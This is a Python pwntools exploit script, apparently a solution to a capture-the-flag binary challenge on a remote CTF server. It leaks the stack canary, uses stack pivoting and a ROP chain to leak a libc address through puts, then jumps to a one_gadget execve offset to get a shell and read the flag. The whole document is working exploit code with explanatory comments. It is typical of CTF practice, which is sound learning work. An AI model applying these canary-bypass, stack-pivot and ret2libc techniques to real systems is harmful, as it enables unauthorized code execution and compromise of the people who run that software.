from pwn import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 41919)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

s_buf_siz = 40
canary_siz = 8
total_siz = s_buf_siz + canary_siz

padding = b'A' * s_buf_siz

vmmap_rw_1 = 0x404800
vmmap_rw_2 = 0x404700
vmmap_rw_3 = 0x404600

pop_rdi = 0x40123e
leave = 0x4013af
retn = pop_rdi + 1
vuln_midentry = 0x401351 # including read 0x40, canary check, congrat printed if former idempotently overwritten, and epilogue
execve_binsh_offset = 0xebc81

congrat = b"Congratulations!\n"

io.sendafter(b"Tell me what's your name?\n", padding)
io.recvuntil(padding)
canary = u64(io.recv(6) + b"\x00\x00")

io.sendafter(
    b" What can you do ?\n",
    # 'read' to override...
    flat(
        padding,        # ...s[]
        canary,         # ...v2 (canary)
        vmmap_rw_1,     # ...saved RBP of 'vuln'
        vuln_midentry,  # ...saved RIP of 'vuln'
    )
)

# canary checked
io.sendafter(
    # congrat printed
    congrat,
    # 'vuln' epilogue, stack pivoted to overridden RBP = vmmap_rw_1 and retn to 'vuln' midentry
    # 'read' to override [vmmap_rw_1 - total_siz]...
    flat(
        vmmap_rw_2,                 # ...vmmap_rw_1 - 48
        pop_rdi, elf.got["puts"],   # ...vmmap_rw_1 - 40
        elf.plt["puts"],            # ...vmmap_rw_1 - 24
        vuln_midentry,              # ...vmmap_rw_1 - 16
        canary,                     # ...vmmap_rw_1 - 8 (canary)
        vmmap_rw_1 - total_siz,     # ...vmmap_rw_1 (saved RBP)
        leave                       # ...vmmap_rw_1 + 8 (saved RIP)
    )
)

# canary checked, congrat printed
io.recvuntil(congrat)
# 'vuln' epilogue, stack pivoted to overridden RBP = vmmap_rw_1 - total_siz and retn to 'leave'
# 'leave' (actually `leave \n retn`) , stack pivoted to overridden RBP = vmmap_rw_2 and retn to RIP (pop_rdi), ROP chain started
# 'puts@plt(puts@got)'
libc.address = u64(io.recv(6) + b'\x00\x00') - libc.sym.puts

# 'vuln_midentry'
io.send(flat(
    vmmap_rw_3,
    libc.address + execve_binsh_offset,
    b'A' * 0x18,
    canary,
    vmmap_rw_2 - total_siz,
    leave
))

# canary checked
io.sendlineafter(
    # congrat printed
    congrat,
    # 'vuln' epilogue, stack pivoted to overridden RBP = vmmap_rw_2 - total_siz and retn to 'leave'
    # 'leave', stack pivoted to overridden RBP = vmmap_rw_3 and retn to RIP (libc.address + execve_binsh_offset), ROP chain started
    # shell gotten
    b"cat flag"
)
print(io.recvuntil(b"\n", drop=True).decode())

io.close()